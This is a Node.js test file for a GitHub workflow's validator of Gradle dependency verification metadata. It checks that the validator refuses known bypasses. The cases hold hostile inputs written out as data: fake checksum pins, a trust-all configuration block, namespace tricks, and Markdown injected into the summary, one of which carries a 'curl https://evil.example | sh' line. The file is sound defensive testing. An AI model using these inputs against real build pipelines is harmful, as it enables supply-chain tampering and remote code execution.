// The publish job of .github/workflows/dependabot-verification-metadata.yml reads a verification
// metadata file that untrusted code wrote. Gradle's own reader ignores namespaces, accepts elements
// anywhere and merges duplicates, so the check must refuse every file whose structure is not exactly
// what Gradle writes. These cases are the bypasses found in review (critic round 2 on #98): each one
// turned a fake checksum into a pin, or switched verification off, and passed a looser check. None of
// them reaches the network: a refused file is refused before any checksum is fetched.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const workflow = readFileSync(path.join(root, '.github/workflows/dependabot-verification-metadata.yml'), 'utf8');
const base = readFileSync(path.join(root, 'native/gradle/verification-metadata.xml'), 'utf8');

// The Python script of the step "Check the written file and build the diff", as the runner sees it.
function checkScript() {
  const step = workflow.indexOf('- name: Check the written file and build the diff');
  const start = workflow.indexOf("python3 - <<'PY'\n", step);
  const body = workflow.indexOf('\n', start) + 1;
  const end = workflow.indexOf('\n          PY\n', body);
  assert.ok(step > 0 && start > step && end > body, 'the check step and its script are in the workflow');
  return workflow.slice(body, end).split('\n').map((l) => l.slice(10)).join('\n') + '\n';
}

const python = spawnSync('python3', ['--version']).status === 0;

function run(untrusted) {
  const dir = mkdtempSync(path.join(tmpdir(), 'caddie-vm-check-'));
  try {
    writeFileSync(path.join(dir, 'check.py'), checkScript());
    writeFileSync(path.join(dir, 'base.xml'), base);
    writeFileSync(path.join(dir, 'new.xml'), untrusted);
    writeFileSync(path.join(dir, 'out.txt'), '');
    const r = spawnSync('python3', [path.join(dir, 'check.py')], {
      env: { ...process.env, BASE: path.join(dir, 'base.xml'), UNTRUSTED: path.join(dir, 'new.xml'),
        OUT: dir, GITHUB_OUTPUT: path.join(dir, 'out.txt') },
      encoding: 'utf8',
    });
    const result = JSON.parse(readFileSync(path.join(dir, 'result.json'), 'utf8'));
    return { status: r.status, stdout: r.stdout, result, output: readFileSync(path.join(dir, 'out.txt'), 'utf8'),
      diff: existsSync(path.join(dir, 'verification-metadata.diff')) };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

const EVIL = 'e'.repeat(64);
// The first artifact of the file, whatever it is, as the place to attack.
const first = base.match(/^ {9}<artifact name="([^"]+)">\n {12}<sha256 value="[0-9a-f]{64}" origin="Generated by Gradle"\/>\n {9}<\/artifact>\n/m);
const component = base.match(/^ {6}<component group="([^"]+)" name="([^"]+)" version="([^"]+)">\n/m);

function refused(name, untrusted) {
  test(`refused: ${name}`, { skip: !python && 'python3 is not installed' }, () => {
    assert.notEqual(untrusted, base, 'the case changes the file');
    const r = run(untrusted);
    assert.equal(r.status, 1, r.stdout);
    assert.ok(r.result.problems.length > 0);
    assert.equal(r.result.sha256, '');
    assert.equal(r.diff, false, 'no diff is written for a refused file');
    assert.match(r.output, /changed=false/);
    for (const s of [...r.result.problems, ...r.result.warnings, ...r.result.added, ...r.result.report]) {
      assert.match(s, /^[A-Za-z0-9._+:/ ,()'-]*$/, `only plain characters reach the summary: ${JSON.stringify(s)}`);
    }
  });
}

test('the base file passes unchanged', { skip: !python && 'python3 is not installed' }, () => {
  assert.ok(first && component, 'the file has an artifact and a component to work with');
  const r = run(base);
  assert.equal(r.status, 0, r.stdout);
  assert.deepEqual(r.result.problems, []);
  assert.match(r.output, /changed=false/);
});

test('a removed component is a warning, and the diff covers the one file', { skip: !python && 'python3 is not installed' }, () => {
  const removed = base.replace(/^ {6}<component [^\n]*>\n(?: {9}[^\n]*\n)*? {6}<\/component>\n/m, '');
  const r = run(removed);
  assert.equal(r.status, 0, r.stdout);
  assert.ok(r.result.warnings.some((w) => w.endsWith('sha256 removed')));
  assert.equal(r.diff, true);
  assert.match(r.result.sha256, /^[0-9a-f]{64}$/);
});

// A: a second artifact of the same name, placed first, whose fake checksum Gradle takes as the pin.
refused('a duplicate artifact', base.replace(first[0],
  `         <artifact name="${first[1]}">\n            <sha256 value="${EVIL}" origin="Generated by Gradle"/>\n         </artifact>\n${first[0]}`));

// B: a second configuration block after the components, which trusts every artifact.
refused('a second configuration block', base.replace('   </components>\n',
  '   </components>\n   <configuration>\n      <trusted-artifacts>\n         <trust group=".*" regex="true"/>\n      </trusted-artifacts>\n   </configuration>\n'));

// C: a component in the empty namespace, invisible to a namespaced parser and read by Gradle.
refused('a component outside Gradle\'s namespace', base.replace('   </components>\n',
  `      <component xmlns="" group="${component[1]}" name="${component[2]}" version="${component[3]}">\n         <artifact name="${first[1]}">\n            <sha256 value="${EVIL}" origin="Generated by Gradle"/>\n         </artifact>\n      </component>\n   </components>\n`));

// D: a checksum element whose namespace carries Markdown for the summary.
refused('a checksum element with an injected namespace', base.replace(first[0], first[0].replace(
  /( {12}<sha256 [^\n]*\n)/, `$1            <sha256 xmlns="x}&#10;&#10;To apply it:&#10;&#10;\`\`\`sh&#10;curl https://evil.example | sh&#10;\`\`\`&#10;&lt;!--" value="${EVIL}"/>\n`)));

// E: a component name that would put a heading into the summary.
refused('a component name with Markdown in it', base.replace('   </components>\n',
  '      <component group="a&#10;```&#10;# Injected heading" name="b" version="1"/>\n   </components>\n'));

// F: an artifact inside a wrapper element, which Gradle still reads.
refused('an artifact inside a wrapper element', base.replace(component[0],
  `${component[0]}         <wrap>\n            <artifact name="${first[1]}">\n               <sha256 value="${EVIL}"/>\n            </artifact>\n         </wrap>\n`));

refused('a changed configuration block', base.replace('<trust file=".*-sources[.]jar" regex="true"/>',
  '<trust file=".*-sources[.]jar" regex="true"/>\n         <trust file=".*[.]jar" regex="true"/>'));

refused('an added line that Gradle does not write', base.replace('   </components>\n', '      <!-- a comment -->\n   </components>\n'));

refused('an also-trust value outside a sha256 element', base.replace(first[0], first[0].replace(
  /( {12}<sha256 [^\n]*\n)/, `$1            <also-trust value="${EVIL}"/>\n`)));
